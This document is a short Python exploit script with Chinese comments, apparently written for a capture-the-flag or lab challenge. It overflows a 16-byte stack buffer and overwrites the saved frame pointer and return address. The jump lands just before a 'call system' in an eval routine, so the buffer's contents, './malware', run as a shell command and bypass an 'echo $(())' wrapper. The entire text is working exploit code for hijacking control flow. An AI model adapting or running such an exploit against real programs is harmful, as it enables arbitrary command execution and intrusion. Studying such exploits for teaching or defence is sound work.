#!/usr/bin/env python3
# 改返回地址，跳到 eval 里 call system 之前，跳过 echo $(()) 包装
#   0x401a6b: mov edi,0x6030d0   (command_buf)
#   0x401a70: call system
# 这样 command_buf 里就是原样输入的 ./malware
import sys
import struct

payload = b"./malware\0".ljust(16, b"A")        # expression[16]
payload += struct.pack("<Q", 0x721000800ff0)    # saved rbp
payload += struct.pack("<Q", 0x401a6b)          # 返回地址
payload += b"\n"

# 33 字节，固定栈那页只剩 48 字节，再多就踩保护页了
sys.stdout.buffer.write(payload)
